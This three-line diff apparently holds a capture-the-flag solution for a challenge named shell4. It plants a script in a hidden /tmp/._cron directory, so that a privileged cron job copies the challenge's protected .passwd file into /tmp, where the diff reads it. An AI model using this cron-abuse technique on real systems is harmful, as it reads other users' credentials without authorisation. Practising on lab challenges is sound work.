@@ -1,0 +1,3 @@
+echo -e '#!/bin/bash\ncat /challenge/shell/shell4/.passwd > /tmp/output.txt' > /tmp/._cron/file.sh
+chmod 777 /tmp/._cron/file.sh
+cat /tmp/output.txt
